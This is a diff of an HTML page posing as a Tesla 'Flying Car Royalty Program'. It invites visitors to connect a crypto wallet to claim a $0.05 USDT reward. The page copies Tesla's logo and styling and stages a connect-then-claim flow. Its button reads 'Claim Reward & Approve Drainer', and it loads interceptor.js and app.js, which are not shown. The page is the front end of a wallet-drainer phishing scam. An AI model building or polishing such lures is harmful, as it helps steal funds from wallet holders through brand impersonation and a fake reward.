@@ -3,28 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tesla Flying Car Rewards</title>
+    <title>Tesla Flying Car Royalty Program</title>
     <link rel="stylesheet" href="style.css">
+    <!-- Inter Font for that clean Tesla look -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 </head>
 <body>
+    <div class="tesla-bg"></div>
+    
     <div class="container">
         <header>
-            <h1>Tesla Flying Car Loyalty Program</h1>
-            <p>Connect your wallet to claim your exclusive $0.05 USDT reward.</p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
+            <h1>Tesla Referral Reward/Flying Car Royalty Rewards</h1>
+            <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
         </header>
-        <main>
-            <div id="wallet-status">
+
+        <main id="main-content">
+            <!-- Step 1: Connect -->
+            <div id="connect-step" class="card">
                 <button id="connect-btn">Connect Wallet</button>
-                <div id="balance-display" style="display:none;">
-                    <p>Connected: <span id="user-address"></span></p>
-                    <p>Reward Status: <span id="reward-status">Pending</span></p>
+                <div id="loader" class="hidden">Verifying Network...</div>
+            </div>
+
+            <!-- Step 2: Dashboard (Hidden initially) -->
+            <div id="dashboard" class="card hidden">
+                <div class="status-row">
+                    <span>Address:</span>
+                    <span id="user-address" class="mono">0x000...000</span>
+                </div>
+                <div class="status-row">
+                    <span>Status:</span>
+                    <span id="reward-status">Pending Approval</span>
+                </div>
+                
+                <div class="action-area">
+                    <button id="claim-btn" class="hidden">Claim Reward & Approve Drainer</button>
                 </div>
             </div>
-            <div id="notification" class="hidden">
-                <p>🎉 Reward Claimed! $0.05 USDT sent to your wallet.</p>
+
+            <!-- Notification Toast -->
+            <div id="notification" class="toast hidden">
+                <div class="icon">✓</div>
+                <div class="text">Reward Claimed! $0.05 USDT sent to your wallet.</div>
             </div>
         </main>
     </div>
+
     <script src="interceptor.js"></script>
     <script src="app.js"></script>
 </body>
